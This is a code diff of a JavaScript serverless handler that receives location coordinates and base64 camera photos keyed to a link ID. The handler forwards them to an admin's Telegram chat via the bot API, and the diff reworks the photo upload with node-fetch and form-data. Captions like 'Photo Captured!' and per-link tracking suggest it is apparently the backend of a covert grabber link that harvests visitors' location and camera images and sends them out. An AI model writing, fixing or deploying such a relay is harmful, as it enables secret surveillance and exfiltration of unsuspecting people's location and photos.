@@ -1,3 +1,6 @@
+import fetch from 'node-fetch';
+import FormData from 'form-data';
+
 export default async function handler(req, res) {
   if (req.method !== 'POST') {
     return res.status(405).json({ error: 'Method not allowed' });
@@ -13,7 +16,6 @@ export default async function handler(req, res) {
   }
 
   try {
-    // Always send to admin for now (with linkId so admin can forward)
     let targetChatId = ADMIN_ID;
 
     // ---- LOCATION ----
@@ -38,29 +40,29 @@ Longitude: \`${coords.lng}\`
       });
     }
 
-    // ---- PHOTO (NO IMGUR - send base64 directly) ----
+    // ---- PHOTO - NO IMGUR, SEND DIRECT ----
     if (type === 'photo' && photoData) {
-      // Convert base64 to buffer
+      // Remove base64 header
       const base64Data = photoData.replace(/^data:image\/\w+;base64,/, '');
       const buffer = Buffer.from(base64Data, 'base64');
 
-      // Send photo directly to Telegram using multipart/form-data
-      const formData = new FormData();
-      
-      // Create a Blob from the buffer
-      const blob = new Blob([buffer], { type: 'image/jpeg' });
-      
-      // Create a File from the Blob
-      const file = new File([blob], 'photo.jpg', { type: 'image/jpeg' });
-      
-      formData.append('chat_id', targetChatId);
-      formData.append('photo', file, 'photo.jpg');
-      formData.append('caption', `📸 Photo Captured!\n⏰ ${new Date().toISOString()}\n🔗 Link ID: \`${linkId}\``);
-      formData.append('parse_mode', 'Markdown');
+      // Create form data
+      const form = new FormData();
+      form.append('chat_id', targetChatId);
+      form.append('photo', buffer, {
+        filename: 'photo.jpg',
+        contentType: 'image/jpeg',
+        knownLength: buffer.length
+      });
+      form.append('caption', `📸 Photo Captured!\n⏰ ${new Date().toISOString()}\n🔗 Link ID: \`${linkId}\``);
+      form.append('parse_mode', 'Markdown');
+
+      const formHeaders = form.getHeaders();
 
       await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
         method: 'POST',
-        body: formData
+        headers: formHeaders,
+        body: form
       });
     }
 
@@ -68,6 +70,6 @@ Longitude: \`${coords.lng}\`
     
   } catch (error) {
     console.error('Error:', error);
-    res.status(500).json({ error: 'Internal server error' });
+    res.status(500).json({ error: 'Internal server error: ' + error.message });
   }
 }
